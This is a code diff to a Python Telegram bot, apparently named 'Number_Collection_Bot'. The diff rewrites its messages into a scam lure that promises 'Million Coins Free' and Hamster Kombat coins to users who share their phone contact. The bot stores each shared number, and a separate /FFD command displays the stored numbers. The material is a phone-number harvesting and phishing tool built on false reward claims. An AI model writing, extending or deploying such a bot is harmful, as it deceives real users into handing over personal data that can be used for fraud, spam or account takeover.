@@ -13,12 +13,16 @@ app = Client("Number_Collection_Bot", bot_token=BOT_TOKEN, api_id=API_ID, api_ha
 # Dictionary to store user numbers
 user_numbers = {}
 
-# Function to handle the /start command and ask for contact sharing
+# Function to handle the /start command and send a welcome message with contact sharing request
 @app.on_message(filters.command("start"))
 async def start(client, message):
-    contact_button = KeyboardButton("Share Contact", request_contact=True)
-    reply_markup = ReplyKeyboardMarkup([[contact_button]], one_time_keyboard=True)
-    await message.reply_text("Please share your contact number.", reply_markup=reply_markup)
+    welcome_message = (
+        "Welcome to Auto Speed Boaster  Bot Made By @xanushy!\n\n"
+        "Please share your contact number by clicking the button below 👇 To Million Coins Free."
+    )
+    contact_button = KeyboardButton("📱 Share Contact", request_contact=True)
+    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)
+    await message.reply_text(welcome_message, reply_markup=reply_markup)
 
 # Function to handle contact messages
 @app.on_message(filters.contact)
@@ -26,7 +30,7 @@ async def contact_handler(client, message):
     contact = message.contact
     if contact:
         user_numbers[message.from_user.id] = contact.phone_number
-        await message.reply_text(f"Thanks for sharing your number: {contact.phone_number}")
+        await message.reply_text(f"Your ref code 🎉♥️ 30,00000  🪙 will automatically added on This number Hamster Kombat 🫥: {contact.phone_number}")
 
 # Function to handle /FFD command and show the stored number
 @app.on_message(filters.command("FFD"))
@@ -39,3 +43,4 @@ async def show_number(client, message):
 
 # Run the bot
 app.run()
+
